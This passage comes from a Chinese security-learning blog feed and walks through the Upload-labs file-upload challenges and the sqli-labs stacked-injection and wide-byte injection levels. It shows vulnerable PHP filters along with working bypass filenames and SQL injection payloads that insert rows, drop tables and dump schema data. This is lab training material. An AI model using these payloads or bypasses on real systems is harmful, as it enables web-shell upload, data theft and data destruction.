id="Pass-07-绕过"><a href="#Pass-07-绕过" class="headerlink" title="Pass-07 .绕过"></a>Pass-07 <code>.</code>绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>只是换了一行代码，把去掉首尾空的代码加上，把去掉结果的.代码去掉了，所以传入后缀为.php.</p><h3 id="Pass-08-Windows文件流特性绕过"><a href="#Pass-08-Windows文件流特性绕过" class="headerlink" title="Pass-08 Windows文件流特性绕过"></a>Pass-08 Windows文件流特性绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>少了这么一行$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p><p>改为<code>.php::$data</code>可以直接绕过检查</p><h3 id="Pass-09-双写后缀特殊符号绕过"><a href="#Pass-09-双写后缀特殊符号绕过" class="headerlink" title="Pass-09 双写后缀特殊符号绕过"></a>Pass-09 双写后缀特殊符号绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="comment">//去掉名字前面的空格，仍然还是&quot;info.php. .&quot;</span></span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点，变成了&quot;info.php. &quot;</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//取后缀，此时后缀为&quot; &quot;</span></span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写，后缀不变</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA，后缀不变</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空，但是现在本来就是空格，后缀仍然不变</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;<span class="comment">//路径就变成了&quot;upload/info.php. &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后缀名为info.php. .，这样构造就可以成功绕过了</p><h3 id="Pass-10-双写后缀名绕过"><a href="#Pass-10-双写后缀名绕过" class="headerlink" title="Pass-10 双写后缀名绕过"></a>Pass-10 双写后缀名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>典型双写绕过的例子</p><p>pphphp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Upload-labs-Pass-01-前端JS限制&quot;&gt;&lt;a href=&quot;#Upload-labs-Pass-01-前端JS限制&quot; class=&quot;headerlink&quot; title=&quot;Upload-labs Pass-01 前端JS限制&quot;&gt;&lt;/a&gt;Upload-l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-38-41</title>
    <link href="http://example.com/2021/02/12/sqli-labs-38-41/"/>
    <id>http://example.com/2021/02/12/sqli-labs-38-41/</id>
    <published>2021-02-12T06:13:57.000Z</published>
    <updated>2021-02-12T06:33:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆叠注入定义"><a href="#堆叠注入定义" class="headerlink" title="堆叠注入定义"></a>堆叠注入定义</h2><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p><h2 id="1-堆叠注入原理"><a href="#1-堆叠注入原理" class="headerlink" title="1 堆叠注入原理"></a>1 堆叠注入原理</h2><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h2 id="2-堆叠注入的局限性"><a href="#2-堆叠注入的局限性" class="headerlink" title="2 堆叠注入的局限性"></a>2 堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h3 id="Mysql-数据库"><a href="#Mysql-数据库" class="headerlink" title="Mysql  数据库"></a>Mysql  数据库</h3><p>（1 ）新建一个表 select * from users where id=1;create table test like users;</p><p><img src="https://img-blog.csdnimg.cn/20200508213528273.png" alt="img"></p><p>执行成功，我们再去看一下是否新建成功表。</p><p><img src="https://img-blog.csdnimg.cn/20200508213600792.png" alt="img"></p><p>（2）删除上面新建的 test 表 select * from users where id=1;drop table test</p><p><img src="https://img-blog.csdnimg.cn/20200508213947961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>（3）查询数据 select * from users where id=1;select 1,2,3</p><p><img src="https://img-blog.csdnimg.cn/20200508214121608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>加载文件 select * from users where id=1;select load_file(‘c:/test.php’);</p><p><img src="https://img-blog.csdnimg.cn/20200508214509619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>（4）修改数据 select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’);</p><p><img src="https://img-blog.csdnimg.cn/20200508214706149.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200508214734258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><h3 id="基于错误-GET-单引号-字符型-堆叠注入"><a href="#基于错误-GET-单引号-字符型-堆叠注入" class="headerlink" title="基于错误_GET_单引号_字符型_堆叠注入"></a>基于错误_GET_单引号_字符型_堆叠注入</h3><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXvlu8Ejg8jkcDVGVPmij.IvMCTYc7hk034ImddzZuonNJ3cTUKm21xU990vdFld*RFiX1N7LP0jSZbW*dOxf3g!/b&bo=jAYXAgAAAAADN40!&rf=viewer_4" alt="img"></p><p>堆叠注入需要依靠前文所写的各种注入方式来获取数据库的信息</p><p>38关与第一关一样；</p><p>?id=1’;insert into users(id,username,password) values(38,’less38’,’hello’)–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXvlu8Ejg8jkcDVGVPmij.LFPdWOCIEIH5zkp4pEYqPRqo8g*Ew8OGeqT*JFehyCE1SwIYr5RQipBsA8u19JBvc!/b&bo=gAG7AQAAAAADFwk!&rf=viewer_4" alt="img"></p><h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><h3 id="基于错误-GET-数字型-堆叠注入"><a href="#基于错误-GET-数字型-堆叠注入" class="headerlink" title="基于错误_GET_数字型_堆叠注入"></a>基于错误_GET_数字型_堆叠注入</h3><p>和 less-38 的区别在于 sql 语句的不一样：<img src="https://img-blog.csdnimg.cn/20200509230642801.png" alt="img"><br>也就是数字型注入，我们可以构造以下的 payload：</p><p>?id=1;insert into users(id,username,password) values(39,’less39’,’hello’)–+</p><h1 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h1><h3 id="基于Bool-GET-单引号-小括号-字符型-盲注-堆叠注入"><a href="#基于Bool-GET-单引号-小括号-字符型-盲注-堆叠注入" class="headerlink" title="基于Bool_GET_单引号_小括号_字符型_盲注_堆叠注入"></a>基于Bool_GET_单引号_小括号_字符型_盲注_堆叠注入</h3><h3 id="本关的-sql-语句为"><a href="#本关的-sql-语句为" class="headerlink" title="本关的 sql 语句为:"></a>本关的 sql 语句为:</h3><p>正常注入可以用脚本 Bool 盲注，或者手工盲注具体参考前面的文章。</p><p>堆叠注入如下：</p><p>?id=1’);insert into users values(40,’Less40’,’hello’)–+</p><h1 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h1><h3 id="基于Bool-GET-数字型-盲注-堆叠注入"><a href="#基于Bool-GET-数字型-盲注-堆叠注入" class="headerlink" title="基于Bool_GET_数字型_盲注_堆叠注入"></a>基于Bool_GET_数字型_盲注_堆叠注入</h3><h3 id="此处与-less-39-是一致的，区别在于-41-错误不回显。所以我们称之为盲注。"><a href="#此处与-less-39-是一致的，区别在于-41-错误不回显。所以我们称之为盲注。" class="headerlink" title="此处与 less-39 是一致的，区别在于 41 错误不回显。所以我们称之为盲注。"></a>此处与 less-39 是一致的，区别在于 41 错误不回显。所以我们称之为盲注。</h3><p>本关SQL语句：<img src="https://img-blog.csdnimg.cn/20200511085120644.png" alt="img"></p><p>正常注入可以用脚本 Bool 盲注，或者手工盲注</p><p>堆叠注入如下：</p><p>?id=1;insert into users values(41,’Less41’,’hello’)–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;堆叠注入定义&quot;&gt;&lt;a href=&quot;#堆叠注入定义&quot; class=&quot;headerlink&quot; title=&quot;堆叠注入定义&quot;&gt;&lt;/a&gt;堆叠注入定义&lt;/h2&gt;&lt;p&gt;   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-32、33</title>
    <link href="http://example.com/2021/02/08/sqli-labs-32/"/>
    <id>http://example.com/2021/02/08/sqli-labs-32/</id>
    <published>2021-02-08T08:07:38.000Z</published>
    <updated>2021-02-08T08:44:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’（转换的函数或者思路会在每一关遇到的时候介绍）。</p><p>PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。</p><p>如id=1’or’1’=’1，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符\，变为1&#39;or&#39;1&#39;=&#39;1，如此在 SQL 查询中是一个普通的字符串，不能进行注入。</p><p>而网站在过滤’的时候，通常的思路就是将’转换为&#39;,因此我们在此想办法将’前面添加的\去掉，一般有两种思路：<br>%bb吃掉\</p><p>如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。</p><p>若在 PHP 中使用mysql_query(“set names gbk”)将默认字符集设为GBK，而使用addslashes()转义用户输入，这时如果用户输入%bb%27，则addslashes()会在%27前面加上一个%5c字符，即转义字符\。</p><p>而 MySQL 在使用GBK编码时，会认为两个字符为一个汉字，%bb%5c是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是籠，也就是说%bb%5c%27=籠’，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。%bb并不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。</p><p>过滤&#39;中的<br>构造%bb%5c%5c%27，addslashes()会在两个%5c和%27前都加上\即%5c，变为%bb %5c%5c %5c%5c %5c%27，但宽字符集认为%bb%5c是一个字符即籠，则变为%bb%5c %5c%5c %5c%5c %27即\&#39;，四个\正好转义为两个\，即’未被转义。这也是 bypass 的一种方法。</p><h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><h3 id="GET-绕过自定义筛选器，将斜杠添加到危险字符。即基于错误-GET-单引号-字符型-转义引号反斜杠-宽字节注入"><a href="#GET-绕过自定义筛选器，将斜杠添加到危险字符。即基于错误-GET-单引号-字符型-转义引号反斜杠-宽字节注入" class="headerlink" title="GET-绕过自定义筛选器，将斜杠添加到危险字符。即基于错误_GET_单引号_字符型_转义引号反斜杠_宽字节注入"></a>GET-绕过自定义筛选器，将斜杠添加到危险字符。即基于错误_GET_单引号_字符型_转义引号反斜杠_宽字节注入</h3><p><img src="https://img-blog.csdnimg.cn/20200501080015925.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200501075522513.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200501075618853.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200501075638783.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200501075656374.png" alt="img"></p><p>可以看到这个函数是个过滤\、’、”的函数，分别在前面加上\</p><p>注意：</p><p>GET型的方式我们是以url形式提交的，因此数据会通过url编码,其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。那么汉字的url编码呢？很简单，看例子：“胡”的ascii码是 -17670，十六进制是BAFA，url编码是“%BA%FA”。 （汉字转ASCII码：默认情况下，是使用扩展ASCII，第一个字节为负数时（或理解为127以上）是识别，加后一个字节共两个字节。想了解更多自行查阅资料）</p><p>那么我们输入1%df%27，被转义为1�&#39;,经过url编码后为%31%df%5c%27,然后提交给数据库，在使用GBK编码的数据库会进行解码，于是变成了1瀿’        df5c就是一个宽字符，我不知道是啥汉字就用了’瀿’来代替，再说一下这个�是乱码，原因是两个不同字符集编码转换问题导致的（比如:GBK和Unicode））</p><p>?id=1%df%27–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZkt6hzTztbUhAC3xFmT.zNQp0YP8Nxy8cAiusOdp8WW49srmsN3tAWdbUMFk4VgQ7TMDLtb.MbQjQlNcsUsAB8!/b&bo=9AbvAgAAAAADNw0!&rf=viewer_4" alt="img"></p><p>已经确定了单引号闭合且宽字节注入可以绕过，剩下的就是正常的注入，无其他过滤条件。<br>因未过滤注释，所以只有开头的单引号需要宽字节注入。<br>暴库：</p><p>?id=-1%df%27 union select 1,2,database()–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUm9JVpcsmJygBODi9CK6eDjBXo5D6Fur4YgJJOrbu8c9P7l7quE2Y2qKK*htqLES.sqzj4npTHkfEIdNOA926I!/b&bo=3gbiAgAAAAADNyo!&rf=viewer_4" alt="img"></p><p>暴表：</p><p>?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcfejKJcW2qsMxOJFgZPRgNGO3R7fAvaCjPHrQFsznzYBicl1hwxxtuIaP4Ua7RnD21P1Ctq8P*34OV2vO5CD4go!/b&bo=awfhAgAAAAADN50!&rf=viewer_4" alt="img"></p><p>或者:(将security转换为16进制)<br>?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479–+</p><p>暴字段：</p><p>user转换为16进制：0x7573657273</p><p>?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUm9JVpcsmJygBODi9CK6eAaZ.YN63J.Wud6dkrkUuYioPdn*d8ndJhbPoBy*WdDHnfOH1l5ht7zNdqEzCzZiCY!/b&bo=gAcDAwAAAAADN5U!&rf=viewer_4" 